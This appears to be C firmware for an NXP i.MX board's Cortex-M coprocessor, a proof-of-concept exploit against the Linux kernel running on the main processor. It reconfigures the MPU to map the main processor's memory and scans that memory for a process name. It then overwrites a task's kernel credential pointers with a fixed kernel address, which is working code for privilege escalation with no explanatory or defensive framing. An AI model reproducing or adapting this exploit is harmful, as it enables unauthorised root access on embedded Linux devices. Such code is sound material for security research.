#include <stdio.h>
#include "board.h"
#include "fsl_debug_console.h"
#include "pin_mux.h"
struct cred {
    uint32_t atomic;
    volatile uint32_t          uid;            /* real UID of the task */
    volatile uint32_t          gid;            /* real GID of the task */
    volatile        uint32_t          suid;           /* saved UID of the task */
    volatile        uint32_t          sgid;           /* saved GID of the task */
    volatile        uint32_t          euid;           /* effective UID of the task */
    volatile        uint32_t          egid;           /* effective GID of the task */
    volatile 			uint32_t   fsuid;

};

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
	printf("%02X ", ((unsigned char*)data)[i]);
	if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
	    ascii[i % 16] = ((unsigned char*)data)[i];
	} else {
	    ascii[i % 16] = '.';
	}
	if ((i+1) % 8 == 0 || i+1 == size) {
	    printf(" ");
	    if ((i+1) % 16 == 0) {
		printf("|  %s \r\n", ascii);
	    } else if (i+1 == size) {
		ascii[(i+1) % 16] = '\0';
		if ((i+1) % 16 <= 8) {
		    printf(" ");
		}
		for (j = (i+1) % 16; j < 16; ++j) {
		    printf("   ");
		}
		printf("|  %s \r\n", ascii);
	    }
	}
    }
    printf("\r\n");
}

uint8_t* find_process(const char* find) {
    int len = strlen(find);

    for(uint8_t *s = 0x40000000; s <  0xC0000000; s++) {
	int found = true;
	uint8_t *c = s;
	for(int i = 0; i < len; i++) {
	    if(*c != find[i]) {
		found = false;
		break;
	    }
	    c++;
	}

	if(found) {
	    printf("at: %p ", s);
#define PAGE_OFFSET		((uint64_t)(0xffffffffffffffff) << (47 - 1))
	    uint64_t start = 0x40000000;
	    uint64_t addr = (*((uint64_t*)(s-16)) & ~PAGE_OFFSET) + start;
	    printf("%p\r\n", addr);
	    struct cred *real_cred = addr - 16; //s - 16;
	    printf("%u\r\n", real_cred->uid);
	DumpHex(addr - 32, 128);


	}
    }
    printf("done\r\n");
}



int main(void) {
    BOARD_RdcInit();
    BOARD_InitPins();
    BOARD_BootClockRUN();
    BOARD_InitDebugConsole();
    //    BOARD_InitMemory();
    
    MPU->CTRL = 0;

MPU->RBAR = (0x40000000U & MPU_RBAR_ADDR_Msk) | MPU_RBAR_VALID_Msk | (2 << MPU_RBAR_REGION_Pos);
 MPU->RASR =
        (0x3 << MPU_RASR_AP_Pos) | (0x1 << MPU_RASR_B_Pos) | (ARM_MPU_REGION_SIZE_2GB << MPU_RASR_SIZE_Pos) | MPU_RASR_ENABLE_Msk;



    MPU->CTRL = MPU_CTRL_ENABLE_Msk | MPU_CTRL_PRIVDEFENA_Msk;
    __DSB();
    __ISB();
    

    printf("=========================\r\n");

#define PAGE_OFFSET		((uint64_t)(0xffffffffffffffff) << (47 - 1))

    uint8_t *ss = 0x0000000076765a08;

    uint64_t start = 0x40000000;
    uint64_t addr = (*((uint64_t*)(ss-16)) & ~PAGE_OFFSET) + start;
    printf("%llx\r\n", addr);

    {
	uint64_t addr = (*((uint64_t*)(ss-16)) & ~PAGE_OFFSET) + start;
	volatile struct cred *cred = addr;
	printf("cred: %d\r\n", cred->uid);
	DumpHex(ss-16, 128);
    }
    __DSB();
    *((uint64_t*) (ss - 16)) = 0xffff8000363bb9c0; 
    __DSB();
    *((uint64_t*) (ss - 8)) = 0xffff8000363bb9c0; 
    __DSB();
    {
	uint64_t addr = (*((uint64_t*)(ss-16)) & ~PAGE_OFFSET) + start;
	volatile struct cred *cred = addr;
	printf("cred: %d\r\n", cred->uid);
	DumpHex(ss-16, 128);
    }
    for(;;);

    uint8_t *s = 0x00000000777a9500;

    for(;;);
}
